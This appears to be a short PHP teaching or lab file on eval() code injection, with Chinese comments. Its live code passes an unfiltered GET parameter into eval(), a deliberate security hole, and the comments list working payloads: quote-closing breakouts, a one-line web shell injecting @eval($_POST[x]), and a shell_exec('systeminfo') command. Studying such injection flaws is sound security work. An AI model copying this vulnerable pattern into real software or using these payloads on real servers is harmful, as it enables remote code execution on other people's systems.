<?php
/*$data = $_GET['data'];//eval()字符串直接利用漏洞,如果phpinfo文件没有关闭权限的话那么就会暴露出php的信息与系统的相关各种信息
$ret = NULL;
eval("\$ret=$data;");
echo $ret;//漏洞利用   ?data=phpinfo()*/

/*$data = $_GET['data'];//闭合绕过
$ret = NULL;
eval("\$ret = \"$data\";");
echo $ret;//  漏洞利用   ?data=";phpinfo();")//
//   ?data=${phpinfo()}（php版本5.5及以上)
//   ?data=");@eval($_POST[x]);//*/

$data = $_GET['data'];
$ret = NULL;
eval("\$ret=strtolower('$data');");
echo $ret;
//漏洞利用
//?data=');phpinfo();//
//?data=');$cmd=shell_exec('systeminfo');$cmd=iconv('gbk','utf-8',$cmd);echo"<pre>{$cmd}</pre>";//